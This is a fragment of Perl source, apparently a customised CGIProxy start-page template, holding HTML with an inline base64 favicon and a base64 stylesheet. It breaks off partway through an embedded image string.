    my $response= $lang eq 'eddiekidiw' || $lang eq ''  ? <<EOR : $MSG{$lang}{'show_start_form.response'} ;
<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.0//EN" "http://www.wapforum.org/DTD/xhtml-mobile10.dtd">
<html xmlns="http://www.w3.org/1999/xhtml%s"><head>%s<title>Start Using CGIProxy | Eddie Kidiw</title><link rel="icon" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAAAABMLAAATCwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0AAHLsMAHH6/ADG2vgFE1bsAWtK5AHKuuACKcsEAryEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADlHgAM0wQAhdQEDPHhQFn/7mOE//Nzof/wcbL/5Fq2/9I2tP++ArTmrQC6bpcAzAIAAAAAAAAAAAAAAADrRwAO4ioArulSQP/4hYT//5af//90kf//YJr//2C3//942P/8ku//6HHq/7YyzP+JAL2RbQDOBQAAAAAAAAAA8FYAkvB3RP/8ppL//3tv//9RWP//Wnn//16b//9cvP//V9r//0z3//F7///WhfH/lzTP/2EAwm8AAAAA+oIAPvh8C/v7uY7//5dq//95W///cWv//3aJ//98rf//e83//3Ht//dj///ZUv//z3z//7Nz7P9ZBszrRgDMIvumAJ79vmD//9Cc//+lW///onH//5qE//+Xm///n7///5/g//6S+//nfP//yWb//6hP//++lf3/ckDd/zYAzHn1vwnV/t2A///RbP//x2v//8eF///Env//vbP//7/Q//+/8f/0sP//1pb//7Z5//+VXv//mXf//4Jl7P8qBNC38doO8f/ykP//6WL//+h2///nk///57D//+bK///l5f/83v3/4cb//8Km//+hhP//fmb//3Zk//+Ie/b/GgjV2OrsDvT5+pL/+v1k//r9e//5/Zj/+v21//r+0//6/u//7/P//9DV//+vs///jZH//2xv//9naf//goP7/wkN2dvN6g7b5PWC/+X/b//g/3n/4P+V/9//r//c/8f/3P/g/9n++v/F6f//p8r//4eq//9pi///eI7//3OG+/8IIt2+suYIrcbrZ//d/5v/xf9v/8P/jP++/6H/uf+z/73/z/+9/+7/sPj//5ne//9+wv//Y6P//569//9Zg/j/AzbiipbfAFKg4Tj/y/aX/67/bP+k/3r/nf+N/5v/o/+k/8T/ov/f/5f/+P+F7///btP//3jF//+Sxfz/FG709gBS8DKA3gAGd9oJsJTiV/+7+Z3/iv9u/3n/dv+C/5f/if+2/4f/0f9+/+z/bfv+/3bo//+b3/z/VLr7/weC9o4AAAAAAAAAAGXYACBM1Q7PdOFY/6H2mf+e/6b/e/+e/3D/rv9w/8f/fP/j/6X/+v+Y9Pv/Vdj1/w23+bYAjfwRAAAAAAAAAAAAAAAAOtUEIiDQCa861z3/auZ8/4jzqv+W+cT/l/vT/4f32/9o7+D/Gufl+grV65gFu/QSAAAAAAAAAAAAAAAAAAAAAAAAAAAN2AADBNATVAzRNa8V0lXaGNR09BjWjPET2KLUDdu5ogbk2UUAAAAAAAAAAAAAAAAAAAAA/D/pEuAPxuzAA6PzgAOQBoAB9AQAASzgAAB0+AAAC6IAAJIIAAC1NwAADnKAAUbMgAF+9sAD7VXgB8pX+B9sCA==" type="image/x-icon"/><link rel="stylesheet" type="text/css" href="data:text/css;base64,YTpsaW5rLCBhOnZpc2l0ZWR7Y29sb3I6I2ZlOGYxNzsgdGV4dC1kZWNvcmF0aW9uOm5vbmV9DQphOmhvdmVyLCBhOmZvY3Vze3RleHQtZGVjb3JhdGlvbjpub25lOyB0ZXh0LXNoYWRvdzowIDAgNnB4ICNmZjRlMDA7IGJhY2tncm91bmQ6dHJhbnNwYXJlbnQgdXJsKGRhdGE6aW1hZ2UvZ2lmO2Jhc2U2NCxSMGxHT0RsaDdBQWVBUGNBQUFBQUFBQUlLUkFoVWlsS2hFcHJwWE9VeG95bDNxVzk5M2QzZDJabVpsVlZWVVJFUkRNek15SWlJaEVSRVFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFDSC9DMDVGVkZORFFWQkZNaTR3QXdFQUFBQWgrUVFKQ2dBQUFDd0FBQUFBN0FBZUFBQUkvd0FCQ0J4SXNLREJnZ0lFSEZ5NE1BRERoeEFqU3B4SXNhTEZpeGd6YXB3WVFJRERqUjgzWGd3cHNxVEpreWhCVGt4SU1tT0FsaWtieHB4SnMyYkVseEpoTG1SNUVpY0FuVEY5Mmh4S05LaEhoaStCN2xTSUVxZlNnVWs1T2t3cXRLalZxeTRIRERnWXRXS0FBVStoVmpXWWRBQ0JzMmpUcGkzQTlxeldvMVRqaGtXcXM2UFd0eDZWZHNVNjFPNkF2QWJOYmhVWThxalhoQkR0b2dWTDFpeGJBd1hXc3AyYzFpeUJ4d1lJL0kxcnNpTmdnUU1NSEpnTXVZQmhxSi81MXV4NDJZRHJ0a3gvRGlqQStDZEJ4QVJmSmt4b1dmUEwybVFGbUhWOXRzRG92TCtOMDk0Y1ZTNU0zY016ejdYb2VmZnNBMkE5aDhiKzhXdHExVVlMRVAvL0s1ekFBUU5nQlZ5dVhSVTM0ZG1RWHhjLy9qZjQ1Zk1FNEc2UGZKLzI5SnZxalFaY1QvQzVOaUFBQW9pV1hYM2dyWFlkQVhJQmNCMXNVejNIM2dESGVVYVZlZmt4K0o1bytiV2ttRnVuRVFqaWZ6YzlTSjVPb2FIblhvTkJCY0FoY2tMSmlCOS9tOWxHR0dKZlFWWWlWT2JkTlZXQS9uR0ZWWUFoVWhjWGtRYzJkbDZUVnowMVlwSVJoYmJjV0R0cVZaeDRFQ0xrVVlMb1lTbWJqNXR0MXlXTUJYMzFwSmhJbFNkZWtUbHRCeVdhc3IwcFhtWS81bWJqWDNNRzUxcUpMQVg1bEhCMnZwa25uUWdhUjJWRTZsRzJhRTVFSGdvZWF4bmVkVUIrRGRrSW9YY1VCV0FjZTM0ZEYrZGlLS3BtWXdGc2ltWFphYWsyMUdLZlVjci8rWkZ3QW56S1ZZOW52Z2hScmR6OVZOYW5wU0lLSUpKMThhYlpvYTF5aFdSc0tKWG4xb0hKWlVpUXBRYkFwYUdWc1hYVUtZWmREc2xoc01JK3hLbW1OZHBJSExNOW1lY2Z1UGE5T1IrbXVoSHdXcFBldFJpWm8yZXhLdWxCdktaM0dZWGhsbFFka0pmU09DT3QrMmFsYm9oWVZrZ1lhbHFDQ0ZpUG1iVkcyM2UzK2J2WWJ1Zyt2QzFrTFI3TGJzQzU3U1lpZkpNcHlwUnV1d2tjbDJQeWFkYmJ2MjJwZFdka1A3TFdGcXl5ZFp4VFJZMVdPekxKZWlic2w1RFA2WnFUYzFUOTVHeksvS21sMW9vM3JlUnpVRzhOUnJSR2V6VjdOVm1jU2RWY3BzbFM1NkdEQ1crOXRFMWxXOVZkMjVBT2JiWGFkS2NwTjAxd2k1dTJ5M1gzTXczVjFuazN0TGZBZmhkK045NGlEVjc0NG94VHgzZmprRWVPMGVHQlMyNDU1SWRmcnZubU1uSHUrZWVnaHk3NjZDZ0ZCQUFoK1FRSkNnQUFBQ3dBQUFBQTdBQWVBQUFJL3dBQkNCeElzS0RCZ3dnVEtseklzS0hEaHhBalNweElzYUxGaXhnemF0eklzYVBIanlCRGloeXBNQURKa3loVHFsdzUwQ1RMbHpCanltem8wbUtBbWpOejZ0ekpFQ2ZGbXp5RDh2U3BrMmhFQVVhRktsMlpOQ1pRbTBoSk5sMGE5T25RcVE0RFJCVnBsZXBQckRiQm5uUjVVeXpOclNFRkNQQWExaXhFdFZuTGRsMG8xMlJTdVJ3RERGakxkYTlMdEd6akFqYW9kWUJodzNNQmFPVUxzYTVqdXdJR0VDQlFvSExseVpnelk5NDcrS0JadUNQMTdoMWd3QUFCdjRHenFoMnN0NEFCeXdVT0VPQjdjelhqaW80bHUzNDkyWEJtMkpvcGx5NHcyNmRXeXNRSFlOVjcrNkZiQUFLRVI3ZGNQUFZaMElvSnlFWmFWdnZzeUdxZjAvK1VmSUE0ZDZKMnliYU1MTm5BZHFCNlMwOTJYY0J2MHNqSE45djIzSmgwZmNqZWljY1djOW5KWnRWTjJzblhYRVlCYVBlZmdJUk54eHRsMnlsMjNIREtFVGJhY01nUmh4bGFXcmtsUUd6S3lUVUFpUkJTdFZpQW5xa2xHV3FFaVhkY2hSMUZ0bG1HQk4xMFlubUFIWGFBQVZIVmhwUi9qR25sM0FBR0NsU2JZVHlPdDFtS1VqbVlXRUU2VGdhaWpLUVpnS05UcEIyQUkzZ2tlaFlmQVg4dG1OQ0lYdUlVbm5aYkhoUVpmWlc5MXRsTWFGYlgwSFNYMmFtYWczT3lOR01CUXpJNUcwSUlHa2hnVmlnU0ZKNEFwWlhvR1pGK2RVbm1UbnI5Nktoek50TFhaa2xkYnBwVGE2L3RwbWVNYk9Lbldta2d3aFVmb0VZMTZDVmlpa1gvVjU2bmlxVWs2NmcwMVNYcmYzUWhxU1dVRjAxVjJJZGkrWWRZcSt6TjU5cWtMZUZZS2F2aGRiZmRYamxLeXBxTnZmV0ptNlRBVmh2YmFlRWRsQ1ZuMXNYbDNYa0hKa2hadG5ZTmhKMWlKNzdHSVlXQVVrdmxkRDlXRjE5NTg4M2FyWks3MG1wVHZJMzZ4R2lhaDViYjY3ZU9BYkRqWlVFUzlhNkZ0a25XbTQ1MzJTZ2Z2ZWcrYkJpNkZ0WVZvOGFtL1h0dnhTZ3UxaWxaOWlsYzBvanljVWJlcjlNNXE2YU1FMGRvOFdubzZVYmZiN0I1Mkp1eU1hTnI4bUpXZFdsWnFOZE82Zko2d2cxblhyTzgxdHFTMHducEpWWlpKVlVaM05mVW5ZYmFZMXhQTkdWaGgwV2JOZFpQeC9weFlpKzJSQ1hiQnVVY2x0VmRtd1VmWG0zM0tTMGFUUTZGeTZCNm9abmNOMVBhVWhsNDRuRXhkWGpiZEp2TmVFOStQbTQ1UjNZM2R2bm1Ld1VFQUNINUJBa0tBQUFBTEFBQUFBRHNBQjRBQUFqL0FBRUlIRWl3b0VHREFRNHFYTWl3b2NPSEVDTktuRWl4b3NXTEdBVUdTSml4bzhlUElFT0tIRmx4STBlU0tCVnVUTW15cGNlVEhVM0NkTm5TWk1PWk5IUFd6Q2hUcDg4QUFuQnE5RW4wcHRDSlIyOEtHQkMwcU00QVRBVU03RGt5cWRPRkszbFNoRG9BcHRXclBBVUVaVW9WNVZld0JZRnFuVGlBZ05TcFo5RldYTHB4YWRlY1diZTZCQnFYWWQ2SFVBbWN0Q2xYSk4yZ1hOL1MvQXU0NzBXK01iMktiV3BRQUFIQkdoMFhqc2lWY0Z2RkVEV25aYnhRYkUzS2tSTVNLR0NnUUlITG9DMjd6YnhaSk5BQmQxY0dEb3I2SUdHTXYzM1RiVGtjNU1iWHVOc2VNTkFWNnV1M3BHdnpUSTZ3TFc0Q1pFZUxOZ3JnZG5LbXVMZFQvelFOMkNGUXVqS0JGampndXNEZDd1SUJXOGJkRyt2NStBUHREbENvLy9MbDkxbmhSOUI1YlJuUUdtdXR6Y2JaWE85aDFaWnJiczBFMUdvR0ZsRFhZQU1Zd041LzJkbVc0WUVHWW5iUVV2Nnhka0NFSlhrWDE0UUd6Q2FXZ0ZNTmdHQ0xaSWtsSTNPYUNUVVppZjZOQmRxQXQ3SDJHZ0VHNWpiaGN0aVJ4ZGh0SllZb2xXaTM5UllBQWV3aFpsbVZFZzZBWkpJZm9oaWFqRU1TTUpFQXJ0Rm5IMkF5bmhnVlh6SnBXY0NQZnFFMllZa1FJZ2dlVHM0NXVkS1ZRd3JwSldkWE51aFhXNWNaV0dHRVVGVTVJSlVLYXZTaG5KYnBxUlNWcnlHSVhWOHNKdmdkb2Y2SldKcUdYVTIySkpXQ05vUWFtVGkrbUJCUW9PSTJJSm5zTmYrWDFuWC93Y2tabzE4ZE9XUlVCYlpJcEFGd0JyQmVjeVRHaXVkU0lRbzFvWkM1TGJWZW95cFoxcDVyYW01S1lvaWxhc1RvVXZYRnFDaEU1RTJKbzFCdWN1dm9jdG1TTk9XSlNVMlc0WnQvTWFtaFd6WitSK1dCekg3RlozYkxhb3JucngwV0ZDbU52QmtZTEtPL0lpb2JwUUg3NXFaajZPRjZWS0Rod2ZxblJSQzNWdDk1dk9HS0ZZK2Qyb3VnZTVqMjZsN0NEYWQxWll0eXJ1dHBkeDVQNWJHMEZTWUkyMW1zQWx2eVV1d21sYWxycmFXclYyZ1MxeVVxc2kxR0I2Uk5rbDBIckVTQlVYaHhuRVFlQUI2aDdLcTg3YXFVeXBrY1lqa1NDV0dTM2NLSEcydjdtYmR3eW1sRlpHdHB3M0xzcktWbGovZmthbE12OUxYU3B0N0xhM1BlRzJWNDRtcFlHdGNkajYvTk81aE1Wd29HWTBadnEwVGh0QnZTOTNoMzhEbUtOMzExSnlhZzV6aURYSGRraDYrMm5udnd5Y1R3NWNCSlJCK240UVdYbXNDd1h6cVRYWkZMbDZLanowRTFMNisvd3F1N1VreGg3aHZmVUZ0bDlLVkRBY0F0NjhOejVGeUQwczdZKy9BT0ZXY1Vmc2lQRmw3cVptSWYwMERXSWVUZDZPTEhtTHY1T3RsMTRmZnBmd1IvL0VoeFJGNzkwTnRuK1huMGZ3UloveVZabjNueVo3N2JCSTZBNHVzZUFNKzBGdHRReFVZQ1hLQUUxV1c0a0VRSEtoR2NvQVloRWhBQUlma0VCUW9BQUFBc0FBQUFBT3dBSGdBQUNQOEFBUWdjU0ZCZ2dJSUlFeW9FY0hDaHc0VUJHaFlNTUVEQXc0c1lNMnJjeUxHang0OFhJNEljS0hFa3dvZ29CUW9RVU5Ha3k1Y3dZOHJNR01EaVNKRXpDYUprR1hGQXlaeEFQZUlNU3RRaHpwVkNoeEx0V1RFaTBxSlFhUXI0R2JXcXdaWWFsVUpsNmJNbVJaOVd3eUljQUZhc1dKNFlVMzdVYXZUclFaUmtiWnFOS25FQWdRRW5hOGFsT25jdFM0dDhHYkpOMm5ibDNZWU4vd2J1S3hQeGdBSmxBUWdnVUtDQWdjc0ZDRXhsZkhKalhMc0U3bllkREZMdFFKYWg3eDcreVZVdVo2QTRLV2FlT3NEQWdic3I3V0xlL0ZyeXhnQ1VEVlN1ZkNEejNwZHZIVk1XdlRMd1Y5NXI5eTRtaVRvMDlKa2lhMUl1VUJ3dlNwUUV1ay8vcityNm9nRHVQbGZtcm54WjgvaU1TSUhQZmkrUWJGUDZDQ2Nmd0p6NnVrR0t0b1hHWFFIKzNjUlFkWmtGS05GMzJ0MUdtbFg0TVJRZUFkK3BOeFZMN1QzNFgwb2w2YVZiZVE5UkpLQUI3a2xGZ0cwVmtSV2FneFBwVnlKd3hVSDMxWDBSU2loY1pzenh4WlJsZUlVMFdXaE5HWldWUmdJSTUxOU56Ym00bUY2cHBXYWZYWllKRjFtSXVrbDVJb2xCS3RRZ2lUTENTS0ZPRTNZWXBtVEJDU2RjZisvVmRGbUJXcWJvNEpLVFlXWVpaRFc2NU9WaTZ0VkdvRkpNQnBqbmsrSGRPT2VVQ2VrSDJXYmF6WG5ZU1ZkbVdWQ2NXRjY0SnFPM1hlbWVkaXNlT2gxRnhVWEkwNTJCNldkZlRkeVZXTldkSVJvS1pHNldYZ2xpQU9nNS8yV1hlQ2RoU0tLT2t3MzZGa3VsZ3RqaWRzUGQ5dVJubGhKcTBJU0t0Umtqa1RZQlowQlhDUTBRSTFhY1BsdW5VS0xTSjJKb2wvRTNGYWNFZ25tYmF3QWFJQ09rcGtLa2FwU0xwZ1dwY1lBMithVkRSUjZRWG5NL3dXanNRdENkWnkyK0I2SklsazduaVpldmlxdm1sVzkxWldyR0VFZDZYUWZqbmczdU9aRzBKSXBXRzVjUnlvWWpBUnlkQnhsV0NXbEkwbVBDSnNtZ3RPRkt0ZUNQQWxaV1pvcFV5ZGJldDJRV04rSjhKSGwxc20wNEhvZmR4dXpkcWhERGxvMTdyV0JjYVJ1bnc4MGg5MWkzdUNFNTliNFFGWnBuazdUNXl2VFVPRjRHbGxPQjVzaGd3Y09WWlhKcGt3a2RJcEpMRThSVmovbloxNlRhaUNISHFwemUvc25tRVZwR1Fja3p3V1hLYlBkK1hUM21zR0M5QlRYalNYYXA2T2lHamUwNmJOTlJQUldTajZqTmlhTnJQelliZCtOR1laNmRYUmR1dW5aSUd1bzFPbnhZcjdWcjFQbUZodGpycEpkTWxscW9RMXphNnBKNUhaUFB5QUV2NG9MQTU0NFJUOS9HRlZieS8wRkYvRTExOXQ2ejhqQjlpdm1wY2VQdUx1N1FNN1M3VHRqcjNmVjNSWGwvcXZBMFlUdDUrWFpXSkJmNk9hbFBsL2V2MHcrL1NkTlB0RC8zZGlwZStQNUhPU0VSa0lEMjYxa0NYelBBQXlwdmdUcUJvQU1uU0VHWVNMQ0NHQ3hmUUFBQU93PT0pfQ0KaW5wdXQsIHNlbGVjdCwgdGV4dGFyZWF7Y29sb3I6bGltZTsgYmFja2dyb3VuZDp0cmFuc3BhcmVudCB1cmwoKTsgbWFyZ2luLXRvcDoxcHg7IG1hcmdpbi1ib3R0b206MXB4OyBwYWRkaW5nOjJweDsgYm9yZGVyOjFweCBzb2xpZCAjNzViZjAwOyB0ZXh0LSBhbGlnbjpjZW50ZXJ9DQppbnB1dDpob3Zlciwgc2VsZWN0OmhvdmVyLCB0ZXh0YXJlYTpob3Zlcntjb2xvcjojNmQ2ZDZkOyBiYWNrZ3JvdW5kOnRyYW5zcGFyZW50IHVybCgpOyBiYWNrZ3JvdW5kLXJlcGVhdDpyZXBlYXQteDsgYmFja2dyb3VuZC1wb3NpdGlvbjo1MCUgYm90dG9tOyBtYXJnaW4tdG9wOjFweDsgbWFyZ2luLWJvdHRvbToxcHg7IHBhZGRpbmc6MnB4OyBib3JkZXI6MXB4IHNvbGlkICMzNTM1MzV9DQppbnB1dDpmb2N1cywgc2VsZWN0OmZvY3VzLCB0ZXh0YXJlYTpmb2N1c3tjb2xvcjojNmQ2ZDZkOyAgYmFja2dyb3VuZDp0cmFuc3BhcmVudCB1cmwoKTsgYmFja2dyb3VuZC1yZXBlYXQ6cmVwZWF0LXg7IGJhY2tncm91bmQtcG9zaXRpb246NTAlIGJvdHRvbTsgbWFyZ2luLXRvcDoxcHg7IG1hcmdpbi1ib3R0b206MXB4OyBwYWRkaW5nOjJweDsgYm9yZGVyOjFweCBzb2xpZCAjMzUzNTM1fQ0KaW1nLmFke3dpZHRoOjE2MHB4OyBoaWdodDozNXB4OyBib3JkZXI6bm9uZX0NCmltZy5ie3dpZHRoOjVweDsgaGlnaHQ6NXB4OyBib3JkZXI6bm9uZX0NCmltZ3ttYXgtd2lkdGg6MTAwJX0NCmJvZHl7Y29sb3I6Izc4Nzg3ODsgYmFja2dyb3VuZDp0cmFuc3BhcmVudCB1cmwoZGF0YTppbWFnZS9naWY7YmFzZTY0LFIwbEdPRGxoTWdBcUFQTUFBQUFBQUJRVUZCY1hGeGtaR1JvYUdod2NIQjBkSFNBZ0lDUWtKQ1ltSmpBd01LdXNyUUFBQUFBQUFBQUFBQUFBQUNINUJBVUtBQXNBSWY4TFRrVlVVME5CVUVVeUxqQURBUUFBQUN3QUFBQUFNZ0FxQUFBRS9oRElTYXU5T050UWdpUUlJUlhGeEhrQWdwamRGN29pY0VycU5BQTNjT2hUS2QyNWxBMG4yZTE0UitCa05RTDRWa3huVDBxYlBvVkNac21ISmVhTTB4K3hLdjd5a09VbEN3V0tGUklDeVN5bE1NaGJnRGJzamtJb05JQ0Jnb09FaFlFMUkxeHplako0Y3lRVGpJOWNYVlJlUldkS2wwMllTV09XbFZ4YlZWcFVvNXhaVGFJVVVaYWFZSnVhbHJDeVhINTJUbkI4ZTQwb2o3cDVMNzBqQ1liR3g4akpHSk5MVVpDN0tWRnppOEp6dGF3VVhMSlJtcStaWTZlZ3JhdTJWcXFrNTV2aTJVTkIzR1BlbmptL2NYUzRiL1Z6dDlEVU1SektBQU1LekNBSno3TmdNUXFpT0RnTkR5TmFuN2pBZ2hoRUc3d3hzS0NrczZReGxaUlZnZWxPZGFRWUJvM0phMmsyd1ZKSXJCNGpscm55T1hMWWFxRE5tOFlZNGtFMHJDZFBadEI0dXZyMExzZTJkaVdQbGd6bnpCUkhjNmlZc2t2WnBSdFJwS2lVeGd4YWg5L09yajN4Y2NWSnRxeWdnekQxUlVtN1V4cWVXZCtNWHUyVVVpdEtqNmVrb3Z1NHNTbklreGZkVFNDcHJtaExYZzM3Z0dXckdOYy9zOGNpQUFBaCtRUUZDZ0FMQUN3QkFBRUFNQUFvQUlNWEZ4Y21KaVl3TURBZEhSMGdJQ0FhR2hvWkdSa1VGQlFrSkNRY0hCd0FBQUQvLy84QUFBQUFBQUFBQUFBQUFBQUUvakFsUlJGU0srdTkxRWxjS0c2S1JFMlVjbEdHWW9TdUM1ZWplS1pxT29GY1NmZS9Xc1pIcktSYXJ4NXl4aE5xU2dHQXMzZVlXcS9ZckhiTDNYd09sQUtpUVBsV1Znb3gyWk1BczkyVzFKZTBGQnBoZFZLT0pYdnVZRHNwRjRCQlQzcytUUjE1STNkS2ZYcG9TQWxSWlcxaFk1VndBZ09YYTJadkZadGRvNlNsVnlwb2N5RmlXV2R5bGlVb2tZOVBCQmhZZ3JkNnNqcUZRNE80amJ0R2ZFa2t0cTNDaGhNSW0yV21KTTJjYjlEVjF0Y0xFeUltbVNjb2FXT3RMVGRNdXNzcHRnU3QzOXBBN2NOR0NPSzk1ZVVVNlZtd2sxTWUyUDcvQUZlRjY2SEcyeXMzQmVZWnMzS2pHQjV6aEJMeEsvS254enNiaXlaK3k2Z0lJaFZZUGdXaEFPaDBnaEsxZ0NoVFhzRUVLbGFLa0IrMHRGU0R6NTNIR0F1SCtIZzRMdDBGZVRZajFyTkk1R2ZOWVR5SDBxRVY0dE9ra2VBOFNYVFNMV29FQUNINUJBVUtBQXNBTEFFQUFRQXdBQ2dBZ3hjWEZ5WW1KakF3TUIwZEhTQWdJQm9hR2hrWkdSUVVGQ1FrSkJ3Y0hBQUFBUC8vL3dBQUFBQUFBQUFBQUFBQUFBVCtzS0N5cXIwNDY1MFJVZ1NvS0FZNUtvbVNqZDlLY0pyeWZXZzlwcXVzWWpyTWh5RlQ2YmE3c0lvV2tHL0piRHFmMEtoMFNzVWNFb2RiYWlRcGFFL1hyTXgzWEpXR3RkeFdlRUxBeXJ6VUdzZXoxZFp1RHR4NFB0R05kbjE3VHdwWEcxMDNBUUFqWVN4Vmo1Q1JUWTJGV0N3MGxUR0lLSDlrZ29JNkkyY3VJa1NpSkhweVJIaCtLQ3N6cmF0Nm55Wkhwd2FrUVlFa0NRRXhsSlFJQWdPTUNaTEh5TWxWWFVzSnhsSkN1V2ExcnRCeXIyTnhkcDFMcGFNL1NqeWd6OHJsNXVmb0YydUdLNVNiSGtodmRydTQ0cWgxTFV5bSs5ZmE1RWs5OU0xYjg0M1BQVUQ1bEhtcEpPYWRnSFFRSTFZb0pzWlp2QVV5TUZHeVNDak11SXNnZ3liUzAyZEFGWkVjQ1FIT3FXWUUxcDJQS0VHT2RHSUpoU0lXdzh5RmlRQUFJZmtFQlFvQUN3QXNBUUFCQURBQUtBQ0RGeGNYSmlZbU1EQXdIUjBkSUNBZ0dob2FHUmtaRkJRVUpDUWtIQndjQUFBQS8vLy9BQUFBQUFBQUFBQUFBQUFBQlA0d0piV3FYUVhkelpkU1dpZCswNmVVQ3BGeWl0R3lJQ1Z1cEhtYUNNaE9DWnpQdEpzSnBTS3dYQVlmY01sc09wL1FxSFRhL0J3U2gwK204RUg4bUZnU2FxdEZjQlhYZzR0YWFibHJuK0t4eFdQZlVLaGM2SEpmMjVGREpuSTBTR2xsWndnQ2JCMWJpNDZQa0pFS0JWVmVNazV2Tnl4RmdUNG1nRjFBTlN4Nm5VRTVOWG1pbWpTY282ZWZtWHBRV1pPUGlaRzV1cnM3S0dsUU9sU3ZmQ3BNWFplVnBueXpxMStZS3NNV0tjZ2pNYnhQZTlmYTJ4dGhhTjZHSU5uUzRlR1dWbGg4ZnMzVUhxQ2dNUjlJZkJQRzFqUThxVGlCUGRMck04Zm11SEF6TUI3QlJBUFExU3JuRFJjTGhyVVFXdUZHc2FMRml4Z3o3a3BCQm9TaWl3Tm1JZ0FBT3c9PSk7IGZvbnQ6MTFweCBUcmVidWNoZXQgTVMsVGFob21hOyBtYXJnaW46MDsgcGFkZGluZzowOyBib3JkZXI6MXB4IHNvbGlkICMzYjNiM2I7IG1hcmdpbjphdXRvOyBtYXgtd2lkdGg6NDUwcHh9DQpib2R5IGltZ3ttYXgtd2lkdGg6OTUlO21heC1oZWlnaHQ6OTUlO30NCmZvcm17Zm9udC1zaXplOnNtYWxsOyBtYXJnaW46MDsgcGFkZGluZzowfQ0KaDN7bWFyZ2luOjA7IHBhZGRpbmc6MDsgcGFkZGluZy1ib3R0b206MnB4fQ0KaHJ7bWFyZ2luLXRvcDoycHg7IG1hcmdpbi1ib3R0b206MnB4OyBib3JkZXItdG9wOjFweCBzb2xpZCAjNDM0MzQzOyBib3JkZXItcmlnaHQtc3R5bGU6bm9uZTsgYm9yZGVyLXJpZ2h0LXdpZHRoOjA7IGJvcmRlci1ib3R0b20tc3R5bGU6bm9uZTsgYm9yZGVyLWJvdHRvbS13aWR0aDowOyBib3JkZXItbGVmdC1zdHlsZTpub25lOyBib3JkZXItbGVmdC13aWR0aDowfQ0KcHttYXJnaW4tdG9wOjZweDsgbWFyZ2luLWJvdHRvbTo2cHh9DQp1bHttYXJnaW46MDsgcGFkZGluZy1sZWZ0OjIwcHh9DQouY2dpe2JhY2tncm91bmQ6dHJhbnNwYXJlbnQgdXJsKGRhdGE6aW1hZ2UvcG5nO2Jhc2U2NCxpVkJPUncwS0dnb0FBQUFOU1VoRVVnQUFBUEFBQUFGQUNBWUFBQUNDNlBGVEFBQmdGRWxFUVZSNG5PMWRQYWhUU1J0T1laSENJb1ZGaWxzWXNEQmdZY0RDZ0kwWExBeFlHTmhpTDFnc3dVS0N4UklzbG92TkVpd2tXRWl3a0l1RkVBc2hGa0lzaE5nSTJVTElGZ3ZaWWlGYmJKRmlpeFJicExDWTczM21KNWt6WitiOEpibm42amNISGs1eWZ0OHpaNTU1ZithZE9ZWEM1MExCdzhQakcwWHVBbmg0ZUdSSDdnSjRlSGhrUis0Q2VIaDRaRWZ1QW5oNGVHUkg3Z0o0ZUhoa1IrNENlSGg0WkVmdUFuaDRlR1JIN2dKNGVIaGtSKzRDZUhoNFpFZnVBbmg0ZUdSSDdnSjRlSGhrUis0Q2VIaDRaRWZ1QW5oNGVHUkg3Z0o0ZUhoa1IrNENlSGg0WkVmdUFuaDRlR1JIN2dKNGVIaGtSKzRDZUhoNFpFZnVBbmg0ZUdSSDdnSjRlSGhrUis0Q2VIaDRaRWZ1QW5oNGVHUkg3Z0o0ZUhoa1IrNENlSGg0WkVmdUFuaDRlR1JIN2dKNGVIaGtSKzRDZUhoNFpFZnVBbmg0ZUdSSDdnSjRlSGhrUis0Q2VIaDRaRWZ1QW5oNGVHUkg3Z0o0ZUhoa1IrNENlSGg0WkVmdUFuaDRlR1JIN2dKNGVIaGtSKzRDZUhoNFpFZnVBbmg0ZUdSSDdnSjRlSGhrUis0Q2VIaDRaRWZ1QW5oNGVHUkg3Z0o0ZUhoa1IrNENlSGg0WkVmdUFuaDRlR1JIN2dKNGVIaGtSKzRDZUhoNFpFZnVBbmg0ZUdSSDdnSj